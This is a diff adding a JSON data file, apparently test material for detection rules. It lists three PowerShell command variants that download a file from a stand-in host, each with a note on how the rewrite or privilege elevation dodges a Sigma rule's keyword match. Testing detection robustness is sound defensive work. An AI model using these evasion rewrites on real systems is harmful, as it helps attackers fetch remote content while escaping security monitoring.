@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri http://example.com/test.txt -OutFile C:\\Temp\\test.txt\"",
+    "explanation": "Reordering: Reordered the command-line arguments to use the full command name 'Invoke-WebRequest' instead of the alias 'IWR', which may avoid the Sigma rule's keyword match."
+  },
+  {
+    "output": "powershell.exe -Command \"(New-Object Net.WebClient).DownloadFile('http://example.com/test.txt', 'C:\\Temp\\test.txt')\"",
+    "explanation": "Substitution: Replaced 'Invoke-WebRequest' with an alternative method using 'DownloadFile' to avoid the Sigma rule's keyword match."
+  },
+  {
+    "output": "powershell.exe -Command \"Start-Process powershell -ArgumentList 'IWR -Uri http://example.com/test.txt -OutFile C:\\Temp\\test.txt' -Verb RunAs\"",
+    "explanation": "Insertion: Wrapped the command in a 'Start-Process' call with elevated privileges, which may bypass the Sigma rule's direct command-line content check."
+  }
+]
